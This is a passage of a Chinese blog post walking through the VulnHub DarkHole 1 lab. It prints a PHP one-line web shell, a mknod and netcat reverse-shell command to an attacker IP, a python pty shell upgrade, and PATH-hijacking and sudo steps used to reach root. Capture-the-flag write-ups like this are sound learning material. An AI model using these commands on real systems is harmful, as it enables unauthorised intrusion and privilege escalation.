+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_post[shell]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用蚁剑链接"><a href="#使用蚁剑链接" class="headerlink" title="使用蚁剑链接"></a>使用蚁剑链接</h3><p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8711.png"></p>
+<p>可以看到蚁剑已经连接成功,</p>
+<p>但在测试访问文件时发现权限太低无法获取更多权限.</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="提权1-失败"><a href="#提权1-失败" class="headerlink" title="提权1:失败"></a>提权1:失败</h2><p>在查看攻略时,使用了一种 我没见过的提权方法</p>
+<h3 id="使用mknod命令提权"><a href="#使用mknod命令提权" class="headerlink" title="使用mknod命令提权"></a>使用mknod命令提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod 设备名称  p &amp;&amp; nc  kali 的ip   kali的端口  0&lt;设备名称 | /bin/bash 1&gt;设备名称</span><br><span class="line">example: mknod backdoor p &amp;&amp; nc 192.168.133.131 8888 0&lt;backdoor | /bin/bash 1&gt;backdoor 获取回显窗口</span><br></pre></td></tr></table></figure>
+
+<p>在蚁剑虚拟终端中输入上述对应的代码后,再在kali中使用nc监听端口,但我测试失败了,搞不懂.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8712.png"></p>
+<p>原文链接:<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangxueying5172/article/details/121552506"> DARKHOLE_1攻略_knight11112的博客-CSDN博客</a></p>
+<p>参考文章:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hnrainll/archive/2011/06/10/2077583.html">mknod用法以及主次设备号 - Leo Chin - 博客园 (cnblogs.com)</a></p>
+<h1 id="提权2-成功"><a href="#提权2-成功" class="headerlink" title="提权2:成功"></a>提权2:成功</h1><p>在另一篇博文中找到了另一种直接将shell反弹到我们攻击机的方法(就是反弹shell)</p>
+<h2 id="php-reverse-shell"><a href="#php-reverse-shell" class="headerlink" title="php-reverse-shell"></a>php-reverse-shell</h2><p>得益于前期测试出的php代码可执行后缀phtml</p>
+<p>我们的反弹shell文件得以上传执行</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8713.png"></p>
+<p>get shell成功后,我们的权限还是太低了,kali 中获得shell 窗口，但是返回的shell 没有显示你所在文件目录,现阶段是那个用户，所以需要使用python 来返回一个shell，大多数Linux 都安装了python3，所以使用python3 来生成一个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty as pt;pt.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>参考文章后我才知道这种方式获得到的shell是不能使用ctrl +c 以及箭头指令的</p>
+<p>参考文章:<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/117554884">实现交互式shell的几种方式：python pty 方式、升级nc、socat、script获取pty_思源湖的鱼的博客-CSDN博客_python pty</a></p>
+<p>拿到完整的shell后就可以进一步测试了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8714.png"></p>
+<p>如图,进行大部分已知到的测试后发现权限还是太低了,得提权到root权才能达到我们的目的</p>
+<h2 id="环境变量提权-失败"><a href="#环境变量提权-失败" class="headerlink" title="环境变量提权(失败)"></a>环境变量提权(失败)</h2><p>参考文章:<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/others-articles/284338.html">DARKHOLE: 1靶机 - FreeBuf网络安全行业门户</a></p>
+<p>该提权是在pass ward文件所在的文件路径下的提权 home/john</p>
+<p>使用方法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash&#x27; &gt; /tmp/id;chmod +x /tmp/id; export PATH=/tmp:$PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8715.png"></p>
+<p>失败了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8716.png"></p>
+<p>环境变量提权参考文章:[( Linux环境变量劫持提权_全局变量Global的博客-CSDN博客_linux环境变量提权)](<a target="_blank" rel="noopener" href="https://blog.csdn.net/nicai321/article/details/122275160#:~:text=linux">https://blog.csdn.net/nicai321/article/details/122275160#:~:text=linux</a> 的 环境变量提权 跟window的 环境变量提权 的思路也是一致的%2C当执行某个命令时%2CShell会按PATH 环境变量 的路径依次搜索命令%2C搜到即停止。,的 劫持提权 。 提权 方法：利用系统命令修改 环境变量 路径 劫持提权)</p>
+<h2 id="另一种环境变量提权-成功"><a href="#另一种环境变量提权-成功" class="headerlink" title="另一种环境变量提权(成功)"></a>另一种环境变量提权(成功)</h2><p>该方法其实和上方失败的方法是本质是一样的,都是通过劫持环境变量,使用假命令来达到欺骗系统的目的</p>
+<p>原文描述:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">切换到/home/john目录下，发现toto文件有执行权限，发现敏感文件user.txt 与 password</span><br><span class="line">执行toto</span><br><span class="line">发现toto文件的功能就是查询用户的uid gid 等参数，与命令id 功能相同,猜测toto文件可能使用的id命令，所以，如果我新建一个假的id命令，id文件中写入/bin/bash 字段，生成一个shell，从而达到提权的目的，因为现在所处的目录没有写的权限，所以在/tmp 目录下新建id文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221106182157.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">touch id</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; id</span><br><span class="line">chmod 777 id</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/john</span><br><span class="line">./toto</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考文章:<a target="_blank" rel="noopener" href="https://blog.csdn.net/rjszz1314/article/details/104399333">chmod 777 到底是啥 ???看完这个你就完全懂了！_人间世庄子的博客-CSDN博客_chmod777</a></p>
+<p>得益于文章描述很详细</p>
+<p>虽然不怎么明白但提权成功了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8717.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8718.png"></p>
+<p>这张图就可以看出我们从www-data 网站权限提升到了root权限组下的用户权限得到了john用户的密码</p>
+<p>但当我尝试 sudo su root 切换到root权限时,系统阻止我了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8719.png"></p>
+<p>根据攻略,这里又有一道转换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">#执行命令输入密码，回显可知，john可以以root的身份执行file.py</span><br><span class="line">所以在file.py 文件中写入 import pty;pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">sudo 执行，即可提权</span><br><span class="line">进入root 目录，即可通关</span><br></pre></td></tr></table></figure>
+
+<p>两个攻略都提及到了这种方法</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/others-articles/284338.html">DARKHOLE: 1靶机 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangxueying5172/article/details/121552506">DARKHOLE_1攻略_knight11112的博客-CSDN博客</a></p>
+<h1 id="root提权成功"><a href="#root提权成功" class="headerlink" title="root提权成功"></a>root提权成功</h1><p>经过上面的一顿操作后终于获得了root权限</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8720.png"></p>
+<p>好复杂,好多不知道的,好多要学的</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8721.png"></p>
+<p>登录进靶机验证</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8722.png"></p>
+<h1 id="成功"><a href="#成功" class="headerlink" title="成功!"></a>成功!</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>本次靶场从网站漏洞到获得服务器权限都并不复杂</p>
+<p>复杂的是在服务器内部提权的过程</p>
+<p>普通的文件上传的漏洞利用,甚至都没有如何为难我们的文件上传,</p>
+<p>在这其中我也学到了反弹shell的一种应用,后期还有多种方法,</p>
+<p>在服务器内部的提权也是没见过的例子,有很多知识点都没见过.</p>
+<h1 id="常看常新-多多学习"><a href="#常看常新-多多学习" class="headerlink" title="常看常新!多多学习~"></a>常看常新!多多学习~</h1><p><img src="/imgs/$%7Bfiilename%7D/%E7%B2%89%E5%A2%A9%E5%AD%90.gif"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 靶场渗透测试</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/11/02/17-48-47/" rel="prev" title="vlunhub-tiki靶场">
+                  <i class="fa fa-chevron-left"></i> vlunhub-tiki靶场
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mosquito</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
